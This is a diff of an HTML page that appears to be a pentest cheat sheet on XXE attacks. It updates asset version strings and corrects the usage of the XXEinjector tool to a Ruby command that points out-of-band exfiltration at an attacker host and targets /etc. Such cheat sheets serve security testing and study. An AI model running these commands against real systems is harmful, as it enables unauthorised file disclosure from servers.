@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=ab9c279">
+  <link rel="stylesheet" href="/assets/style.css?v=b4bc827">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1797,7 +1797,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <tr>
 <td><strong>XXEinjector</strong></td>
 <td>Automated XXE payload generation</td>
-<td><code>./xxeinjector.py -u http://target.com -f file</code></td>
+<td><code>ruby xxeinjector.rb --host=&lt;our IP&gt; --path=/etc --file=&lt;file with requests&gt;</code></td>
 </tr>
 <tr>
 <td><strong>oxml_xxe</strong></td>
@@ -1829,8 +1829,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <h3 id="xxeinjector"><a href="https://github.com/enjoiz/xxeinjector">XXEinjector</a></h3>
 <pre class="highlight"><code class="language-bash">git clone https://github.com/enjoiz/XXEinjector.git
 cd XXEinjector
-./xxeinjector.py -u http://target.com/api/process -f file.xml
-./xxeinjector.py -u http://target.com -t bing -p http://127.0.0.1:8080/admin</code></pre>
+ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt</code></pre>
 <h3 id="oxml_xxe"><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a></h3>
 <pre class="highlight"><code class="language-bash">apt-get install -y make git libsqlite3-dev libxslt-dev libxml2-dev zlib1g-dev gcc ruby3.2 g++
 gem install bundler
@@ -1963,6 +1962,6 @@ ruby server.rb</code></pre>
       });
     });
   </script>
-  <script src="/assets/main.js?v=ab9c279" defer></script>
+  <script src="/assets/main.js?v=b4bc827" defer></script>
 </body>
 </html>
